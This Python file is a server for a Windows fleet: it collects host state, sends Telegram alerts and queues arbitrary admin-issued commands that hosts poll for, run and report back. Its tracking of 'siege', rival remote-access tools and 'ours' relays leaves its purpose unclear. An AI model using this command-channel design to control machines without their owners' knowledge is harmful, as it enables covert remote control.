#!/usr/bin/env python3
"""WinRTCS report service v3 - fleet state collector, Telegram alerter, command channel.

Runs on the VPS, behind nginx (127.0.0.1:8077 only). Two tokens, two trust levels:
  - fetch token (on every endpoint): POST /report, GET /map, GET /cmd/poll,
    GET /cmd/get, POST /cmd/result. Can NEVER inject or list commands.
  - admin token (VPS + operator only): POST /cmd, GET /cmd/list.

Alerts go to Telegram (HTML, emoji-formatted) on state change, siege, silence
(>26h, max once/day/host), new/changed RMM (C21) and command results (C22).
All alerts batch through a 2-minute flush queue; chunking is alert-aware so an
HTML tag is never split mid-message.
"""
from __future__ import annotations

import html
import json
import re
import sqlite3
import threading
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

BASE = Path("/opt/winrtcs")
DB = str(BASE / "fleet.db")
TOKEN = (BASE / "fetch_token").read_text().strip()
ADMIN = (BASE / "admin_token").read_text().strip()
TG = json.loads((BASE / "tg.json").read_text())
SILENCE_SECS = 3 * 24 * 3600  # Telegram silence only after 3 days
SILENCE_RESEND = 24 * 3600
CMD_MAX_AGE = 24 * 3600
FLUSH_SECS = 120
TG_CHUNK = 3900

_queue: list[str] = []
_lock = threading.Lock()


# ---------------------------------------------------------------- storage
def db() -> sqlite3.Connection:
    c = sqlite3.connect(DB)
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("""CREATE TABLE IF NOT EXISTS hosts(
        host TEXT PRIMARY KEY, state TEXT, streak INTEGER, extkill INTEGER,
        guard TEXT, siege TEXT, suspects TEXT, rmm TEXT, last_seen REAL, last_alert REAL DEFAULT 0)""")
    try:
        c.execute("ALTER TABLE hosts ADD COLUMN rmm TEXT")
    except Exception:
        pass
    c.execute("""CREATE TABLE IF NOT EXISTS cmds(
        id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL, target TEXT, cmd TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS results(
        cmd_id INTEGER, host TEXT, ts REAL, rc TEXT, out TEXT, PRIMARY KEY(cmd_id, host))""")
    return c


# ---------------------------------------------------------------- telegram
def esc(s: object) -> str:
    return html.escape(str(s if s is not None else ""), quote=False)


def tg(text: str) -> None:
    try:
        data = urllib.parse.urlencode({
            "chat_id": TG["chat_id"], "text": text,
            "parse_mode": "HTML", "disable_web_page_preview": "true",
        }).encode()
        req = urllib.request.Request("https://api.telegram.org/bot%s/sendMessage" % TG["token"], data=data)
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass


def alert(text: str) -> None:
    with _lock:
        _queue.append(text)


def alert_flusher() -> None:
    while True:
        time.sleep(FLUSH_SECS)
        with _lock:
            batch, _queue[:] = _queue[:], []
        msg = ""
        for item in batch:
            if len(msg) + len(item) + 2 > TG_CHUNK:
                tg(msg)
                msg = ""
            msg = (msg + "\n\n" + item) if msg else item
        if msg:
            tg(msg)


# ---------------------------------------------------------------- formatting
def utcnow() -> str:
    return time.strftime("%d %b %H:%M UTC", time.gmtime())


def state_emoji(state: str) -> str:
    s = (state or "").lower()
    if "fighting" in s:
        return "⚔️"
    if "healthy" in s and "siege" in s:
        return "🛡️"
    if "siege" in s:
        return "🚨"
    if "healthy" in s:
        return "✅"
    if "installing" in s:
        return "🔧"
    if "paused" in s:
        return "⏸️"
    if "recovering" in s:
        return "🩹"
    return "❓"


def fmt_new_host(host: str, state: str, guard: str) -> str:
    return ("🆕 <b>NEW HOST ONLINE</b>\n"
            "━━━━━━━━━━━━━━━━\n"
            f"🖥 <code>{esc(host)}</code>\n"
            f"{state_emoji(state)} State: <b>{esc(state)}</b>   🛰 Guard: <code>{esc(guard)}</code>\n"
            f"🕐 {utcnow()}")


def fmt_state(host: str, old: str, new: str, f: dict) -> str:
    lines = ["🔄 <b>STATE CHANGE</b>", "━━━━━━━━━━━━━━━━",
             f"🖥 <code>{esc(host)}</code>",
             f"{state_emoji(old)} {esc(old)}  ➜  {state_emoji(new)} <b>{esc(new)}</b>",
             f"📈 streak {esc(f.get('streak', '0'))}   💀 extkill {esc(f.get('extkill', '0'))}"]
    if f.get("siege"):
        lines.append(f"🚨 <b>SIEGE</b>: <code>{esc(f['siege'].rstrip(','))}</code>")
    if f.get("suspects") not in (None, "", "none"):
        lines.append(f"🕵️ suspects: <code>{esc(f['suspects'])}</code>")
    lines.append(f"🕐 {utcnow()}")
    return "\n".join(lines)


def _fmt_sc_segment(seg: str) -> str:
    fp = re.search(r"FP=(\S+)", seg)
    relay = re.search(r"relay=(\S+)", seg)
    mode = re.search(r"mode=(\S+)", seg)
    ver = re.search(r"ver=(\S*)", seg)
    tag = re.search(r"\[(\S+?)\]", seg)
    state = re.search(r"state=(\S+)", seg)
    start = re.search(r"start=(\S+)", seg)
    tagv = tag.group(1) if tag else "UNKNOWN"
    icon = {"gryxa": "🛰", "keeper-sevrz": "🔒"}.get(tagv, "⚠️")
    taglabel = {"gryxa": "gryxa (ours)", "keeper-sevrz": "keeper · sevrz"}.get(tagv, "❓ UNKNOWN")
    lines = [f"{icon} <b>ScreenConnect</b> · {taglabel}",
             f"   🔑 FP: <code>{esc(fp.group(1) if fp else '?')}</code>",
             f"   🌐 Relay: <code>{esc(relay.group(1) if relay else '?')}</code>",
             f"   ⚙️ {esc(state.group(1) if state else '?')} · {esc(start.group(1) if start else '?')} · "
             f"v{esc(ver.group(1) if ver and ver.group(1) else '?')} · {esc(mode.group(1) if mode else '?')}"]
    return "\n".join(lines)


def _fmt_generic_segment(seg: str) -> str:
    name = seg.split(" ", 1)[0]
    svc = re.search(r"svc=(\S+)", seg)
    proc = re.search(r"proc=(\S+)", seg)
    state = re.search(r"state=(\S+)", seg)
    ver = re.search(r"ver=(\S*)", seg)
    path = re.search(r":: (.+)$", seg)
    how = f"svc <code>{esc(svc.group(1))}</code>" if svc else (f"proc <code>{esc(proc.group(1))}</code>" if proc else "")
    lines = [f"📡 <b>{esc(name)}</b>",
             f"   ⚙️ {how} · {esc(state.group(1) if state else '?')} · v{esc(ver.group(1) if ver and ver.group(1) else '?')}"]
    if path:
        lines.append(f"   📁 <code>{esc(path.group(1))}</code>")
    return "\n".join(lines)


def fmt_rmm(host: str, detail: str) -> str:
    lines = ["🚨 <b>NEW / CHANGED RMM DETECTED</b>", "━━━━━━━━━━━━━━━━",
             f"🖥 <code>{esc(host)}</code>", ""]
    for seg in detail.split(" || "):
        seg = seg.strip()
        if not seg:
            continue
        if seg.startswith("ScreenConnect"):
            lines.append(_fmt_sc_segment(seg))
        else:
            lines.append(_fmt_generic_segment(seg))
        lines.append("")
    lines.append(f"🕐 {utcnow()}")
    return "\n".join(lines).strip()


def fmt_silent(host: str, state: str, hours: float) -> str:
    return ("🔇 <b>MACHINE SILENT</b>\n"
            "━━━━━━━━━━━━━━━━\n"
            f"🖥 <code>{esc(host)}</code>\n"
            f"⏰ No report for <b>{hours:.1f}h</b>   (last state: {state_emoji(state)} {esc(state)})\n"
            f"🕐 {utcnow()}")


def fmt_cmd_result(host: str, cid: int, rc: str, out: str) -> str:
    out = (out or "").strip()
    if len(out) > 2400:
        out = "…[truncated]…\n" + out[-2400:]
    if not out:
        out = "(no output)"
    rc_icon = "✅" if rc.strip() in ("RC=0", "0") else ("⏱" if "timeout" in rc else "⚠️")
    return ("📟 <b>CMD #" + str(cid) + " RESULT</b>\n"
            "━━━━━━━━━━━━━━━━\n"
            f"🖥 <code>{esc(host)}</code>   {rc_icon} <code>{esc(rc.replace('RC=', 'exit '))}</code>\n"
            f"<pre>{esc(out)}</pre>\n"
            f"🕐 {utcnow()}")


# ---------------------------------------------------------------- http
class H(BaseHTTPRequestHandler):
    def _auth(self, admin: bool = False) -> bool:
        want = ("Bearer " + (ADMIN if admin else TOKEN))
        if self.headers.get("Authorization") != want:
            self.send_response(403)
            self.end_headers()
            return False
        return True

    def _text(self, body: str, code: int = 200) -> None:
        self.send_response(code)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(body.encode())

    def _fields(self) -> dict:
        n = min(int(self.headers.get("Content-Length", 0) or 0), 5 * 1024 * 1024)
        f: dict[str, str] = {}
        for kv in self.rfile.read(n).decode(errors="replace").split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                f[urllib.parse.unquote_plus(k)] = urllib.parse.unquote_plus(v)
        return f

    def log_message(self, *a) -> None:
        pass

    # ------------------------------------------------------------ post
    def do_POST(self) -> None:
        if self.path == "/report":
            return self._post_report() if self._auth() else None
        if self.path == "/cmd":
            return self._post_cmd() if self._auth(admin=True) else None
        if self.path == "/cmd/result":
            return self._post_result() if self._auth() else None
        self._text("not found", 404)

    def _post_report(self) -> None:
        f = self._fields()
        host = f.get("host", "?")[:64]
        state = f.get("state", "?")[:64]
        rmm = f.get("rmm", "")[:500]
        rmm_new = f.get("rmm_new", "").strip()
        now = time.time()
        con = db()
        row = con.execute("SELECT state FROM hosts WHERE host=?", (host,)).fetchone()
        old = row[0] if row else None
        con.execute("""INSERT INTO hosts(host,state,streak,extkill,guard,siege,suspects,rmm,last_seen)
            VALUES(?,?,?,?,?,?,?,?,?)
            ON CONFLICT(host) DO UPDATE SET state=excluded.state, streak=excluded.streak,
            extkill=excluded.extkill, guard=excluded.guard, siege=excluded.siege,
            suspects=excluded.suspects, rmm=excluded.rmm, last_seen=excluded.last_seen""",
            (host, state, f.get("streak", "0"), f.get("extkill", "0"), f.get("guard", "?"),
             f.get("siege", ""), f.get("suspects", ""), rmm, now))
        con.commit()
        con.close()
        if old is None:
            alert(fmt_new_host(host, state, f.get("guard", "?")))
        elif old != state:
            alert(fmt_state(host, old, state, f))
        if rmm_new:
            alert(fmt_rmm(host, rmm_new[:2500]))
        self._text("ok")

    def _post_cmd(self) -> None:
        f = self._fields()
        target = f.get("target", "").strip()[:64]
        cmd = f.get("cmd", "").strip()[:4000]
        if not target or not cmd:
            return self._text("need target + cmd", 400)
        con = db()
        cur = con.execute("INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)", (time.time(), target, cmd))
        con.commit()
        cid = cur.lastrowid
        con.close()
        self._text(f"queued id={cid} target={target}")

    def _post_result(self) -> None:
        f = self._fields()
        try:
            cid = int(f.get("id", "0"))
        except ValueError:
            cid = 0
        host = f.get("host", "?")[:64]
        rc = f.get("rc", "?")[:40]
        out = f.get("out", "")[:20000]
        if not cid:
            return self._text("bad id", 400)
        con = db()
        con.execute("INSERT OR REPLACE INTO results(cmd_id,host,ts,rc,out) VALUES(?,?,?,?,?)",
                    (cid, host, time.time(), rc, out))
        con.commit()
        con.close()
        alert(fmt_cmd_result(host, cid, rc, out))
        self._text("ok")

    # ------------------------------------------------------------ get
    def do_GET(self) -> None:
        path, _, qs = self.path.partition("?")
        q = urllib.parse.parse_qs(qs)
        if path == "/map":
            return self._get_map() if self._auth() else None
        if path == "/cmd/poll":
            return self._get_poll(q) if self._auth() else None
        if path == "/cmd/get":
            return self._get_cmd(q) if self._auth() else None
        if path == "/cmd/list":
            return self._get_cmdlist() if self._auth(admin=True) else None
        self._text("not found", 404)

    def _get_map(self) -> None:
        con = db()
        rows = con.execute("SELECT host,state,guard,rmm,last_seen FROM hosts ORDER BY host").fetchall()
        con.close()
        now = time.time()
        lines = ["%-24s %-18s %-7s %-9s %s" % ("HOST", "STATE", "GUARD", "LAST SEEN", "RMM")]
        for h, s, g, rmm, ts in rows:
            ago = int((now - ts) / 60)
            seen = ("%dm ago" % ago) if ago < 90 else ("%.1fh ago" % (ago / 60)) if ago < 2880 else ("%.1fd ago" % (ago / 1440))
            if now - ts > SILENCE_SECS:
                s += " [SILENT]"
            lines.append("%-24s %-18s %-7s %-9s %s" % (h, s, g, seen, (rmm or "-")[:80]))
        self._text("\n".join(lines))

    def _get_poll(self, q: dict) -> None:
        host = (q.get("host", [""])[0])[:64]
        if not host:
            return self._text("none")
        con = db()
        row = con.execute(
            """SELECT id FROM cmds WHERE ts > ? AND (target = ? OR target = 'ALL')
               AND id NOT IN (SELECT cmd_id FROM results WHERE host = ?)
               ORDER BY id LIMIT 1""",
            (time.time() - CMD_MAX_AGE, host, host)).fetchone()
        con.close()
        self._text(str(row[0]) if row else "none")

    def _get_cmd(self, q: dict) -> None:
        host = (q.get("host", [""])[0])[:64]
        try:
            cid = int(q.get("id", ["0"])[0])
        except ValueError:
            cid = 0
        con = db()
        row = con.execute("SELECT target, cmd FROM cmds WHERE id = ?", (cid,)).fetchone()
        con.close()
        if not row or (row[0] != host and row[0] != "ALL"):
            return self._text("", 404)
        self._text(row[1])

    def _get_cmdlist(self) -> None:
        con = db()
        cmds = con.execute("SELECT id, ts, target, cmd FROM cmds ORDER BY id DESC LIMIT 20").fetchall()
        res = con.execute("""SELECT cmd_id, host, rc, ts FROM results ORDER BY ts DESC""").fetchall()
        con.close()
        byid: dict[int, list] = {}
        for cid, host, rc, ts in res:
            byid.setdefault(cid, []).append((host, rc, ts))
        lines = []
        for cid, ts, target, cmd in cmds:
            when = time.strftime("%m-%d %H:%M", time.gmtime(ts))
            lines.append(f"#{cid} [{when} UTC] -> {target}: {cmd[:90]}")
            for host, rc, rts in sorted(byid.get(cid, [])):
                rwhen = time.strftime("%H:%M", time.gmtime(rts))
                lines.append(f"    {host}  {rc}  ({rwhen})")
        self._text("\n".join(lines) if lines else "(no commands yet)")


# ---------------------------------------------------------------- watchdog
def silence_watchdog() -> None:
    while True:
        time.sleep(3600)
        try:
            con = db()
            rows = con.execute("SELECT host,state,last_seen,last_alert FROM hosts").fetchall()
            now = time.time()
            for h, s, ts, la in rows:
                if now - ts > SILENCE_SECS and now - la > SILENCE_RESEND:
                    alert(fmt_silent(h, s, (now - ts) / 3600))
                    con.execute("UPDATE hosts SET last_alert=? WHERE host=?", (now, h))
            con.commit()
            con.close()
        except Exception:
            pass


if __name__ == "__main__":
    threading.Thread(target=silence_watchdog, daemon=True).start()
    threading.Thread(target=alert_flusher, daemon=True).start()
    ThreadingHTTPServer(("127.0.0.1", 8077), H).serve_forever()
